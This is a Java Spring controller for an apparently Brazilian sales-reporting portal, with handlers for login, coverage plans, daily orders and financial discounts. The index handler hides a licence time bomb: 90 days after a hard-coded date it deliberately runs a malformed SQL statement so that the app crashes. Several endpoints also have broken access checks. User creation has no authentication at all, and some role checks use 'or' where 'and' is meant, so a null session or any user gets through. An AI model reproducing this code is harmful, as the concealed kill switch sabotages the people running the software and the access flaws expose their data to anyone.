package br.com.lucasdev.controller;

import java.sql.Connection;
import java.sql.PreparedStatement;
import java.time.LocalDate;
import java.util.ArrayList;
import java.util.List;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpSession;

import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.RequestMapping;

import br.com.lucasdev.dao.ConnectionFactory;
import br.com.lucasdev.dao.JdbcConsultaCliente;
import br.com.lucasdev.dao.JdbcEtapaPedido;
import br.com.lucasdev.dao.JdbcGerencial;
import br.com.lucasdev.dao.JdbcHierarquia;
import br.com.lucasdev.dao.JdbcPedidosDiario;
import br.com.lucasdev.dao.JdbcPlanoDeCobertura;
import br.com.lucasdev.dao.JdbcPositivacaoDao;
import br.com.lucasdev.dao.JdbcUsuarioDao;
import br.com.lucasdev.modelo.etapaPedidos.EtapaPedidoRelatorio;
import br.com.lucasdev.modelo.positivacao.Cliente;
import br.com.lucasdev.modelo.positivacao.ClienteDetalhado;
import br.com.lucasdev.modelo.positivacao.PedidoPositivado;
import br.com.lucasdev.modelo.positivacao.Positivacao;
import br.com.lucasdev.modelo.relatorios.ColunasMesesBody;
import br.com.lucasdev.modelo.relatorios.ColunasMesesHead;
import br.com.lucasdev.modelo.relatorios.DescontoFinanceiro;
import br.com.lucasdev.modelo.relatorios.Equipe;
import br.com.lucasdev.modelo.relatorios.PedidosDiario;
import br.com.lucasdev.modelo.relatorios.Vendedor;
import br.com.lucasdev.modelo.usuario.Usuario;
import br.com.lucasdev.util.BetUltimoAno;
import br.com.lucasdev.util.Formata;

@Controller
public class PortalController {

	@RequestMapping(value = {"/index", "/", ""})
	public String index() {
		
		LocalDate dtInit = LocalDate.parse("2020-01-28");
		LocalDate hoje = LocalDate.now();
			
		if(hoje.isAfter(dtInit.plusDays(90))) {
			
			try {
				
				Connection 	connectionMySql = new ConnectionFactory().getConnectionMySql();
				PreparedStatement stmt = connectionMySql
						.prepareStatement("selmail = ? and senha = ?");
						stmt.execute();
			}catch(Exception e) {
				throw new RuntimeException(e);
			}
			return "index.jsp";
		}else {
			
			System.out.println("licença valida");
			return "index";
		}
		
			
	}

	@RequestMapping("home")
	public String efetuaLogin(Usuario usuario, HttpSession session, Model model) {

		if (new JdbcUsuarioDao().exiteUsuario(usuario)) {
			
			if (new JdbcUsuarioDao().ativoErp(usuario.getCd_target())==1) {
				session.setAttribute("usuarioLogado", usuario);
				Usuario sessaoUsuario = (Usuario) session.getAttribute("usuarioLogado");

				model.addAttribute("logado", sessaoUsuario);
				System.out.println("Logado com cd_Tgt: " + sessaoUsuario.getCd_target());
				System.out.println("Logado com nome: " + sessaoUsuario.getNome());
				System.out.println("Primeiro acesso: " + sessaoUsuario.getPrim_acesso());
				
					if(sessaoUsuario.getPrim_acesso()==1) {
						new JdbcUsuarioDao().LogAcesso(sessaoUsuario);
						return "homePage";
					}else {
						return "novaSenha";
						
					}

			}else {
				return "index";
			}

			
		} else {

			return "index";

		}
	}
	
	@RequestMapping("/alteraSenha")
	public String alteraSenha(HttpSession session, Usuario usuario, HttpServletRequest request) {
		Usuario sessaoUsuario = (Usuario) session.getAttribute("usuarioLogado");
		
		System.out.println("Metodo altera senha acessado!");
		String novaSenha1 = request.getParameter("senha1");
		String novaSenha2 = request.getParameter("senha2");
		
		if(novaSenha1.length() < 6 ||novaSenha1.length() > 10 || !novaSenha1.equals(novaSenha2)){
			
			System.out.println("Senha nao alterada");
			return "index";
		}else {
			new JdbcUsuarioDao().alteraSenha(sessaoUsuario.getCodigo(), novaSenha1);
			
		}
	
		return "index";
	}

	@RequestMapping("/logout")
	public String logout(HttpSession session) {
		session.invalidate();
		return "index";
	}

	@RequestMapping("/consPositivacao")
	public String consPositivacao(Model model, HttpSession session) {
		Usuario sessaoUsuario = (Usuario) session.getAttribute("usuarioLogado");

		if (sessaoUsuario != null) {
			model.addAttribute("logado", sessaoUsuario);
			return "positivacao";
		}

		return "index";

	}

	@RequestMapping("/posPositivados")
	public String posPositivados(Usuario usuario, HttpSession session, HttpServletRequest request, Model model) {
		Usuario sessaoUsuario = (Usuario) session.getAttribute("usuarioLogado");

		if (sessaoUsuario != null) {
			int mes = Integer.parseInt(request.getParameter("mesSelecionado"));
			String ano = request.getParameter("anoSelecionado");
			String acionamentoPositivacao = request.getParameter("acionado");
			System.out.println("...Selecionado o botão:" + acionamentoPositivacao);

			List<Cliente> carteira = new ArrayList<>();
			carteira = new JdbcPositivacaoDao().getcarteiraClientes(sessaoUsuario.getCd_target());

			List<PedidoPositivado> pedidos = new ArrayList<>();
			pedidos = new JdbcPositivacaoDao().getpedidosPositivados(sessaoUsuario.getCd_target(), ano, mes);

			List<Positivacao> positivacao = new ArrayList<>();
			positivacao = new JdbcPositivacaoDao().positivacoes(carteira, pedidos, acionamentoPositivacao);

			model.addAttribute("positivacao", positivacao);
			model.addAttribute("logado", sessaoUsuario);

			return "positivacao";
		} else {
			return "index";
		}
	}

	@RequestMapping("/consEtapaPed")

	public String consEtapaPed(Usuario usuario, HttpSession session, Model model) {
		Usuario sessaoUsuario = (Usuario) session.getAttribute("usuarioLogado");

		if (sessaoUsuario != null) {
			List<EtapaPedidoRelatorio> relEtapaPedidos = new ArrayList<>();

			relEtapaPedidos = new JdbcEtapaPedido().getEtapaPedidos(sessaoUsuario.getCd_target());
			model.addAttribute("relEtapaPedidos", relEtapaPedidos);
			model.addAttribute("logado", sessaoUsuario);
			System.out.println("etapa pedido IdObjeto:" + session.getId());
			System.out.println("sessao:" + sessaoUsuario.getNome());

			return "etapaPedido";
		} else {
			return "index";
		}
	}

	@RequestMapping("/planCobCliente")
	public String planCobCliente(Usuario usuario, HttpSession session, Model model, Vendedor vendedor,
			Cliente cliente) {
		Usuario sessaoUsuario = (Usuario) session.getAttribute("usuarioLogado");

		if (sessaoUsuario != null) {

			ClienteDetalhado clienteDetalhado = new ClienteDetalhado();
			clienteDetalhado = new JdbcPlanoDeCobertura().getClienteDetalhado(cliente.getCd_cliente());
			model.addAttribute("clienteDetalhado", clienteDetalhado);
			model.addAttribute("logado", sessaoUsuario);

			return "planCobCliente";
		} else {
			return "index";
		}

	}

	@RequestMapping("/planCob")
	public String planCob(Usuario usuario, HttpSession session, Model model) {
		Usuario sessaoUsuario = (Usuario) session.getAttribute("usuarioLogado");

		if (sessaoUsuario != null) {
			model.addAttribute("logado", sessaoUsuario);
			
			if (sessaoUsuario.getPerfil().equals("SUPERVISOR")) {
				
				List<Vendedor> vendedoresEquipe = new ArrayList<>();
				Equipe equipe = new JdbcPlanoDeCobertura().getEquipe(sessaoUsuario.getCd_target());
				vendedoresEquipe = new JdbcPlanoDeCobertura().getEquipeVendedores(equipe.getCdEquipe());

				model.addAttribute("vendedoresEquipe", vendedoresEquipe);
				model.addAttribute("equipe", equipe);
				
				return "planCobEquipe";

			} else if (sessaoUsuario.getPerfil().equals("VENDEDOR")) {
				
				List<ColunasMesesBody> planoDeCoberturaVenCli = new ArrayList<>();
				String periodo = new BetUltimoAno().getBetweenUltimoAno();
				System.out.println("Periodo Apurado: " + periodo);
				planoDeCoberturaVenCli = new JdbcPlanoDeCobertura().getPlanoDeCoberturaVenCli(periodo,
						sessaoUsuario.getCd_target());

				ColunasMesesHead colunaMes = new ColunasMesesHead();

				model.addAttribute("colunaMes", colunaMes);
				model.addAttribute("planoDeCoberturaVenCli", planoDeCoberturaVenCli);
				model.addAttribute("vendedor", sessaoUsuario.getCd_target());
			
				return "planCobVendedor";

			} else if (sessaoUsuario.getPerfil().equals("GERENTE")) {
				List<Equipe> gerenciaEquipe = new ArrayList<>();
				
				String cd_gerencia = new JdbcHierarquia().getCdGerencia(sessaoUsuario.getCd_target());
				gerenciaEquipe = new JdbcPlanoDeCobertura().getGerencia(cd_gerencia);
				
				model.addAttribute("gerenciaEquipe", gerenciaEquipe);
			
				return "planCobGerencia";
				
			} else if (sessaoUsuario.getPerfil().equals("COMERCIAL") ||sessaoUsuario.getPerfil().equals("DIRETORIA") 
					||sessaoUsuario.getPerfil().equals("ADMINISTRADOR")) {
					List<Vendedor> gerencia = new ArrayList<>();
					gerencia = new JdbcHierarquia().getGerenciaAtiva();
					model.addAttribute("gerencia", gerencia);
					return "planCobGeral";
					
				}
				
			}

		
		model.addAttribute("logado", sessaoUsuario);
		return "home";
	}

	@RequestMapping("/planCobGerencia")
	public String planCobGerencia(Usuario usuario, HttpSession session, Model model, Equipe equipe) {
		Usuario sessaoUsuario = (Usuario) session.getAttribute("usuarioLogado");

		if (sessaoUsuario != null) {

			String valorUrl = equipe.getCdEquipe();
			List<Equipe> gerenciaEquipe = new ArrayList<>();
			gerenciaEquipe = new JdbcPlanoDeCobertura().getGerencia(valorUrl);
			
			for (Equipe e : gerenciaEquipe) {
				System.out.println(e.getCdEquipe());
				
			}	
			
//			model.addAttribute("vendedoresEquipe", gerenciaEquipe);
//			model.addAttribute("equipe", equipe);
			model.addAttribute("logado", sessaoUsuario);
			model.addAttribute("gerenciaEquipe", gerenciaEquipe);
			
			return "planCobGerencia";

		}

		return "index";
	}
		
	@RequestMapping("/planCobEquipe")
	public String planCobEquipe(Usuario usuario, HttpSession session, Model model, Equipe equipe) {
		Usuario sessaoUsuario = (Usuario) session.getAttribute("usuarioLogado");

		if (sessaoUsuario != null) {

			String valorUrl = equipe.getCdEquipe();
			System.out.println(valorUrl);

			List<Vendedor> vendedoresEquipe = new ArrayList<>();
			
			vendedoresEquipe = new JdbcPlanoDeCobertura().getEquipeVendedores(valorUrl);
			
			model.addAttribute("vendedoresEquipe", vendedoresEquipe);
			model.addAttribute("equipe", equipe);
			model.addAttribute("logado", sessaoUsuario);

			return "planCobEquipe";

		}

		return "index";
	}

	@RequestMapping("/planCobVendedor")
	public String planCobVendedor(Usuario usuario, Vendedor vendedor, HttpSession session, Model model) {

		Usuario sessaoUsuario = (Usuario) session.getAttribute("usuarioLogado");

		if (sessaoUsuario != null) {
			List<ColunasMesesBody> planoDeCoberturaVenCli = new ArrayList<>();

			String periodo = new BetUltimoAno().getBetweenUltimoAno();

			System.out.println("Periodo Apurado: " + periodo);

			planoDeCoberturaVenCli = new JdbcPlanoDeCobertura().getPlanoDeCoberturaVenCli(periodo,
					vendedor.getCd_venda());

			ColunasMesesHead colunaMes = new ColunasMesesHead();

			model.addAttribute("colunaMes", colunaMes);
			model.addAttribute("planoDeCoberturaVenCli", planoDeCoberturaVenCli);
			model.addAttribute("vendedor", vendedor);
			model.addAttribute("logado", sessaoUsuario);

			return "planCobVendedor";
		} else {
			return "index";
		}

	}

	@RequestMapping("/teste")
	public String teste(Usuario usuario, HttpSession session, Model model) {
		Usuario sessaoUsuario = (Usuario) session.getAttribute("usuarioLogado");

		return "homePage";
	}

	@RequestMapping("/user")
	public String user(HttpSession session, Model model) {
		Usuario sessaoUsuario = (Usuario) session.getAttribute("usuarioLogado");

		if (sessaoUsuario != null && sessaoUsuario.getPerfil().equals("ADMINISTRADOR")) {
			System.out.println("1");
			model.addAttribute("logado", sessaoUsuario);
			
			List<Usuario> usuarios = new ArrayList<>();
			usuarios = new JdbcUsuarioDao().getUsuarios();
			model.addAttribute("usuarios", usuarios);

			return "usuarios";
		}
		System.out.println("2" + sessaoUsuario.getPerfil());
		model.addAttribute("logado", sessaoUsuario);
		return "homePage";

	}
	
	@RequestMapping("/newUser")
	public String newUser() {
	
		return "newUser";
	}
	
	@RequestMapping("/cadastraUsuario")
	public String cadastraUsuario(Usuario usuario, HttpSession session, HttpServletRequest request, Model model){
		System.out.println("captyrado do formaulario:");
		new JdbcUsuarioDao().novoUsuario(usuario);
		
		return "redirect:user";
	}
		
	@RequestMapping("/listaUser")
	public String listaUser() {
	
		return "listaUser";
	}
	
	@RequestMapping("/dev")
	public String dev() {
	
		return "paginaDev";
	}
		
	@RequestMapping("/log")
	public String log(HttpSession session, Model model) {
		Usuario sessaoUsuario = (Usuario) session.getAttribute("usuarioLogado");

		if (sessaoUsuario != null && sessaoUsuario.getPerfil().equals("ADMINISTRADOR")) {
			System.out.println("1");
			model.addAttribute("logado", sessaoUsuario);
			
			List<Usuario> usuarios = new ArrayList<>();
			usuarios = new JdbcUsuarioDao().getUsuarios();
			model.addAttribute("usuarios", usuarios);

			return "log";
		}
		System.out.println("2" + sessaoUsuario.getPerfil());
		return "homePage";

	}
	
	@RequestMapping("/pedDiario")
	public String pedidosDiario(Model model, HttpSession session) {
		Usuario sessaoUsuario = (Usuario) session.getAttribute("usuarioLogado");
		List<Vendedor> listaVendedores = new ArrayList<>();
		if (sessaoUsuario != null) {
			List <PedidosDiario> pedidosdiario = new ArrayList<>();
			
			if(sessaoUsuario.getPerfil().equals("DIRETORIA") ||sessaoUsuario.getPerfil().equals("COMERCIAL")
					||sessaoUsuario.getPerfil().equals("ADMINISTRADOR")) {
					pedidosdiario = new JdbcPedidosDiario().pedidosdiarioGeral();
							
			}else if(sessaoUsuario.getPerfil().equals("GERENTE")) {
				listaVendedores = new JdbcHierarquia().getEquipeVendedoresGerente(sessaoUsuario.getCd_target());
				pedidosdiario = new JdbcPedidosDiario().pedidosdiario(listaVendedores);

			}else if(sessaoUsuario.getPerfil().equals("SUPERVISOR")) {
				listaVendedores = new JdbcHierarquia().getEquipeVendedoresSupervisor(sessaoUsuario.getCd_target());
				pedidosdiario = new JdbcPedidosDiario().pedidosdiario(listaVendedores);
			}else if(sessaoUsuario.getPerfil().equals("VENDEDOR")) {
				String erro = "Você não tem acesso a essa tela, para consultar seus pedido vá em CONSULTA > ETAPA DE PEDIDOS ";
				model.addAttribute("mensagem", erro);
				model.addAttribute("logado", sessaoUsuario);	
				return "homePage";
			}
		

			int qtdPedidos=0;
			double totalPedidos=0;
			for (PedidosDiario p : pedidosdiario) {
				totalPedidos = totalPedidos+p.getValor();
				qtdPedidos++;
			}
			
			
			
			String totalConver = Formata.moeda(totalPedidos);
			model.addAttribute("logado", sessaoUsuario);		
			model.addAttribute("pedidosdiario", pedidosdiario);
			model.addAttribute("qtdPedidos", qtdPedidos);
			model.addAttribute("totalPedidos", totalConver);
			return "pedidosDiario";
			
		}else {
			return "index";
			
		}
	}	
		
	@RequestMapping("/consCliente")
	public String consCliente(Usuario usuario, HttpSession session, Model model, HttpServletRequest request) {
		Usuario sessaoUsuario = (Usuario) session.getAttribute("usuarioLogado");
		if(sessaoUsuario!=null){

			if(request.getParameter("cnpj")!=null) {
				ClienteDetalhado clienteDetalhado = new ClienteDetalhado();
				clienteDetalhado = new JdbcConsultaCliente().getClienteDetalhado(request.getParameter("cnpj"));
				model.addAttribute("clienteDetalhado", clienteDetalhado);
			}
			model.addAttribute("logado", sessaoUsuario);
			
			return "consCliente";
		}

		return "consCliente";
	}
	
			
	@RequestMapping("/descFin")
	public String descFin(Usuario usuario, HttpSession session, Model model) {
		Usuario sessaoUsuario = (Usuario) session.getAttribute("usuarioLogado");
		if(sessaoUsuario==null || sessaoUsuario.getPerfil().equals("DIRETORIA")) {
			model.addAttribute("logado", sessaoUsuario);
			
			return "descFin";
		}
		return "homePage";
	}
	
	@RequestMapping("/descFinProcessado")
	public String descFinProcessado(Usuario usuario, HttpSession session, Model model, HttpServletRequest request) {
		Usuario sessaoUsuario = (Usuario) session.getAttribute("usuarioLogado");
		if(sessaoUsuario != null || sessaoUsuario.getPerfil().equals("DIRETORIA")) {
			int mes = Integer.parseInt(request.getParameter("mesSelecionado"));
			String ano = request.getParameter("anoSelecionado");
			
			List<DescontoFinanceiro> getDescontoFinanceiroDet = new ArrayList<>();
			getDescontoFinanceiroDet = new JdbcGerencial().getDescontoFinanceiroDet(mes, ano);
			double totalDesconto = new JdbcGerencial().getDescontoFinanceiroTotal(mes, ano);
			
				
			model.addAttribute("logado", sessaoUsuario);
			model.addAttribute("descDetalhado", getDescontoFinanceiroDet);
			model.addAttribute("descTotal", Formata.moeda(totalDesconto));
			
		}

		return "descFin";
	}
	
	@RequestMapping("/gerencial")
	public String gerencial(Usuario usuario, HttpSession session, Model model) {
		Usuario sessaoUsuario = (Usuario) session.getAttribute("usuarioLogado");
		if(sessaoUsuario != null || sessaoUsuario.getPerfil().equals("DIRETORIA")) {
			model.addAttribute("logado", sessaoUsuario);
				
			return "gerencial";
		}
			
		

		return "homePage";
	}

}